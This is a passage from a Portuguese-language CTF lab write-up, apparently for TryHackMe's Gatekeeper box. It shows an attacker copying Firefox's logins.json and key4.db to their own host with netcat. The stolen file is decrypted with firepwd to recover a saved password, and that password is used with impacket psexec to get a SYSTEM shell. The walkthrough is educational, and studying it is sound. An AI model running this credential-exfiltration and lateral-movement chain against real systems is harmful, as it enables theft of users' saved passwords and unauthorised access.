C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>dir

dir

 Volume in drive C has no label.

 Volume Serial Number is 3ABE-D44B

  

 Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release

  

08/15/2025  08:34 PM    <DIR>          .

08/15/2025  08:34 PM    <DIR>          ..

05/14/2020  10:30 PM                24 addons.json

05/14/2020  10:23 PM             1,952 addonStartup.json.lz4

05/14/2020  10:45 PM                 0 AlternateServices.txt

05/14/2020  10:30 PM    <DIR>          bookmarkbackups

05/14/2020  10:24 PM               216 broadcast-listeners.json

04/22/2020  12:47 AM           229,376 cert9.db

04/21/2020  05:00 PM               220 compatibility.ini

04/21/2020  05:00 PM               939 containers.json

04/21/2020  05:00 PM           229,376 content-prefs.sqlite

05/14/2020  10:45 PM           524,288 cookies.sqlite

05/14/2020  10:24 PM    <DIR>          crashes

05/14/2020  10:45 PM    <DIR>          datareporting

04/21/2020  05:00 PM             1,111 extension-preferences.json

04/21/2020  05:00 PM    <DIR>          extensions

05/14/2020  10:34 PM            39,565 extensions.json

05/14/2020  10:45 PM         5,242,880 favicons.sqlite

05/14/2020  10:39 PM           196,608 formhistory.sqlite

04/21/2020  10:50 PM    <DIR>          gmp-gmpopenh264

04/21/2020  10:50 PM    <DIR>          gmp-widevinecdm

04/21/2020  05:00 PM               540 handlers.json

04/21/2020  05:02 PM           294,912 key4.db

05/14/2020  10:43 PM               600 logins.json

04/21/2020  05:00 PM    <DIR>          minidumps

08/15/2025  08:28 PM            38,616 nc.exe

05/14/2020  10:23 PM                 0 parent.lock

05/14/2020  10:25 PM            98,304 permissions.sqlite

04/21/2020  05:00 PM               506 pkcs11.txt

05/14/2020  10:45 PM         5,242,880 places.sqlite

05/14/2020  10:45 PM            11,096 prefs.js

05/14/2020  10:45 PM            65,536 protections.sqlite

05/14/2020  10:45 PM    <DIR>          saved-telemetry-pings

05/14/2020  10:23 PM             2,715 search.json.mozlz4

05/14/2020  10:45 PM                 0 SecurityPreloadState.txt

04/21/2020  10:50 PM    <DIR>          security_state

05/14/2020  10:45 PM               288 sessionCheckpoints.json

05/14/2020  10:45 PM    <DIR>          sessionstore-backups

05/14/2020  10:45 PM            12,889 sessionstore.jsonlz4

04/21/2020  05:00 PM                18 shield-preference-experiments.json

05/14/2020  10:45 PM             1,357 SiteSecurityServiceState.txt

04/21/2020  05:00 PM    <DIR>          storage

05/14/2020  10:45 PM             4,096 storage.sqlite

04/21/2020  05:00 PM                50 times.json

05/14/2020  10:45 PM                 0 TRRBlacklist.txt

04/21/2020  05:00 PM    <DIR>          weave

04/21/2020  05:02 PM            98,304 webappsstore.sqlite

05/14/2020  10:45 PM               140 xulstore.json

              34 File(s)     12,339,402 bytes

              14 Dir(s)  15,835,492,352 bytes free
              
```

Aqui há dois arquivos interessantes pra mim: *logins.json* (contém senhas salvas do navegador) e *key4.db* (é onde é guardada a chave de criptografia usada em *logins.json*).

Os dois arquivos trabalham em conjunto para lidar com senhas salvas no Firefox

```

C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>nc.exe -nv 10.23.149.250 3333 < logins.json

nc.exe -nv 10.23.149.250 3333 < logins.json

  

C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>nc.exe -nv 10.23.149.250 3333 < key4.db    

nc.exe -nv 10.23.149.250 3333 < key4.db

  

C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release> 


```

Paralelamente, resolvi utilizar uma ferramenta chamada firepwd para quebrar a criptografia de senhas salvas do Mozilla.

```bash

┌──(kali㉿kali)-[~/gatekeeper]

└─$ git clone https://github.com/lclevy/firepwd.git          

Cloning into 'firepwd'...

remote: Enumerating objects: 88, done.

remote: Counting objects: 100% (8/8), done.

remote: Compressing objects: 100% (8/8), done.

remote: Total 88 (delta 2), reused 3 (delta 0), pack-reused 80 (from 1)

Receiving objects: 100% (88/88), 239.08 KiB | 824.00 KiB/s, done.

Resolving deltas: 100% (41/41), done.

┌──(kali㉿kali)-[~/gatekeeper]

└─$ ls

BrainStorm-THM-ChatServer.exe-Exploit  payload.py  teste_controle_ip.py  test_payload.py

firepwd                                rev.exe     teste_offset.py

┌──(kali㉿kali)-[~/gatekeeper]

└─$ cd firepwd        

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ ls

firepwd.py  LICENSE  mozilla_db  mozilla_pbe.pdf  mozilla_pbe.svg  readme.md  requirements.txt

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip                                            

--2025-08-15 20:22:39--  https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip

Resolving eternallybored.org (eternallybored.org)... 2a01:260:4094:1:42:42:42:42, 84.255.206.8

Connecting to eternallybored.org (eternallybored.org)|2a01:260:4094:1:42:42:42:42|:443... connected.

HTTP request sent, awaiting response... 200 OK

Length: 111892 (109K) [application/zip]

Saving to: ‘netcat-win32-1.12.zip’

  

netcat-win32-1.12.zip        100%[============================================>] 109.27K   144KB/s    in 0.8s    

  

2025-08-15 20:22:41 (144 KB/s) - ‘netcat-win32-1.12.zip’ saved [111892/111892]

  

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ ls

firepwd.py  mozilla_db       mozilla_pbe.svg        readme.md

LICENSE     mozilla_pbe.pdf  netcat-win32-1.12.zip  requirements.txt

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ unzip netcat-win32-1.12.zip                    

Archive:  netcat-win32-1.12.zip

  inflating: doexec.c                

  inflating: getopt.c                

  inflating: netcat.c                

  inflating: generic.h              

  inflating: getopt.h                

  inflating: hobbit.txt              

  inflating: license.txt            

  inflating: readme.txt              

  inflating: Makefile                

  inflating: nc.exe                  

  inflating: nc64.exe                

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ ls

doexec.c    getopt.c    LICENSE      mozilla_db       nc64.exe  netcat-win32-1.12.zip  requirements.txt

firepwd.py  getopt.h    license.txt  mozilla_pbe.pdf  nc.exe    readme.md

generic.h   hobbit.txt  Makefile     mozilla_pbe.svg  netcat.c  readme.txt

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

10.10.46.133 - - [15/Aug/2025 20:28:03] "GET /nc.exe HTTP/1.1" 200 -

^C

Keyboard interrupt received, exiting.

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ nc -lnvp 3333 > logins.json

listening on [any] 3333 ...

connect to [10.23.149.250] from (UNKNOWN) [10.10.46.133] 49227

^C

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ ls        

doexec.c    getopt.c    LICENSE      Makefile         mozilla_pbe.svg  netcat.c               readme.txt

firepwd.py  getopt.h    license.txt  mozilla_db       nc64.exe         netcat-win32-1.12.zip  requirements.txt

generic.h   hobbit.txt  logins.json  mozilla_pbe.pdf  nc.exe           readme.md

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ cat logins.json    

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ nc -lnvp 3333 > logins.json

listening on [any] 3333 ...

connect to [10.23.149.250] from (UNKNOWN) [10.10.46.133] 49230

^C

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ nc -lnvp 3333 > key4.db    

listening on [any] 3333 ...

connect to [10.23.149.250] from (UNKNOWN) [10.10.46.133] 49231

^C

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ ls                            

doexec.c    getopt.c    key4.db      logins.json  mozilla_pbe.pdf  nc.exe                 readme.md

firepwd.py  getopt.h    LICENSE      Makefile     mozilla_pbe.svg  netcat.c               readme.txt

generic.h   hobbit.txt  license.txt  mozilla_db   nc64.exe         netcat-win32-1.12.zip  requirements.txt

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ python3 -m venv venv                      

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ source venv/bin/activate

┌──(venv)─(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ pip install -r requirements.txt

Collecting PyCryptodome>=3.9.0 (from -r requirements.txt (line 1))

  Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)

Collecting pyasn1>=0.4.8 (from -r requirements.txt (line 2))

  Downloading pyasn1-0.6.1-py3-none-any.whl.metadata (8.4 kB)

Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)

   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 1.4 MB/s eta 0:00:00

Downloading pyasn1-0.6.1-py3-none-any.whl (83 kB)

Installing collected packages: PyCryptodome, pyasn1

Successfully installed PyCryptodome-3.23.0 pyasn1-0.6.1

┌──(venv)─(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ python3 firepwd.py            

globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'

 SEQUENCE {

   SEQUENCE {

     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2

     SEQUENCE {

       SEQUENCE {

         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2

         SEQUENCE {

           OCTETSTRING b'9e0554a19d22a773d0c5497efe7a80641fa25e2e73b2ddf3fbbca61d801c116d'

           INTEGER b'01'

           INTEGER b'20'

           SEQUENCE {

             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256

           }

         }

       }

       SEQUENCE {

         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC

         OCTETSTRING b'b0da1db2992a21a74e7946f23021'

       }

     }

   }

   OCTETSTRING b'a713739460522b20433f7d0b49bfabdb'

 }

clearText b'70617373776f72642d636865636b0202'

password check? True

 SEQUENCE {

   SEQUENCE {

     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2

     SEQUENCE {

       SEQUENCE {

         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2

         SEQUENCE {

           OCTETSTRING b'f1f75a319f519506d39986e15fe90ade00280879f00ae1e036422f001afc6267'

           INTEGER b'01'

           INTEGER b'20'

           SEQUENCE {

             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256

           }

         }

       }

       SEQUENCE {

         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC

         OCTETSTRING b'dbd2424eabcf4be30180860055c8'

       }

     }

   }

   OCTETSTRING b'22daf82df08cfd8aa7692b00721f870688749d57b09cb1965dde5c353589dd5d'

 }

clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'

decrypting login/password pairs

   https://creds.com:b'mayor',b'8CL7O1N78MdrCIsV'
   
```

Excelente! Obtive uma senha do usuário mayor. Apesar dessa senha não necessariamente ser da conta de usuário Windows, posso testá-la para logar com ela.

Além disso, vou utilizar a vulnerabilidade no serviço psexec que usa credenciais válidas para logar no servidor smb e obter privilégios de system.

```

┌──(venv)─(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ deactivate                    

┌──(kali㉿kali)-[~/gatekeeper/firepwd]

└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.46.133 cmd.exe

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

  

[*] Requesting shares on 10.10.46.133.....

[*] Found writable share ADMIN$

[*] Uploading file IUJwbsNg.exe

[*] Opening SVCManager on 10.10.46.133.....

[*] Creating service CZga on 10.10.46.133.....

[*] Starting service CZga.....

[!] Press help for extra shell commands

Microsoft Windows [Version 6.1.7601]

Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

  

C:\Windows\system32> cd ..

C:\Windows> cd ..

C:\> cd Users

C:\Users> cd mayor

C:\Users\mayor> cd Desktop

C:\Users\mayor\Desktop> dir

 Volume in drive C has no label.

 Volume Serial Number is 3ABE-D44B

  

 Directory of C:\Users\mayor\Desktop

  

05/14/2020  09:58 PM    <DIR>          .

05/14/2020  09:58 PM    <DIR>          ..

05/14/2020  09:21 PM                27 root.txt.txt

               1 File(s)             27 bytes

               2 Dir(s)  15,835,402,240 bytes free

  

C:\Users\mayor\Desktop> type root.txt.txt

{Th3_M4y0r_C0ngr4tul4t3s_U}

C:\Users\mayor\Desktop>
```